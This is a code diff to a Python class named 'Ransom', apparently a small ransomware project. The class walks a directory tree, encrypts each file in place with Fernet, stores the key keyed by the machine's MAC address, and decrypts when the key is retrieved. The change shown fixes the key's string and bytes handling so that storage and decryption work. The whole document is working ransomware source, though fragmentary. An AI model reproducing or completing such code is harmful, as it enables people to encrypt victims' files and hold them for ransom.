@@ -41,7 +41,8 @@ class Ransom:
                     self.encryptFile(filePath)
             #for name in dirs:
                # print(os.path.join(root, name))
-        self.keyManager.insertKey(get_mac(), self.key)
+        s = str(self.key)[2:-1]
+        self.keyManager.insertKey(get_mac(), s)
 
     def encryptFile(self, file):
         with open(file, 'rb+') as f:
@@ -52,8 +53,9 @@ class Ransom:
             f.truncate()
 
     def startDecryption(self):
-        self.key = self.keyManager.getKey(get_mac())
-        print(self.key)
+        self.key = bytes(self.keyManager.getKey(get_mac()).encode())
+
+        self.fernet = Fernet(self.key)
         if self.key == '':
             raise ValueError('The key is empty. Cannot decrypt without a key')
             print('No key') ### TODO díla við þetta
@@ -61,6 +63,8 @@ class Ransom:
         
         self.decrypt()
     
+
+
     def decrypt(self):
         for root, dirs, files in os.walk(self.root):
             for file in files:
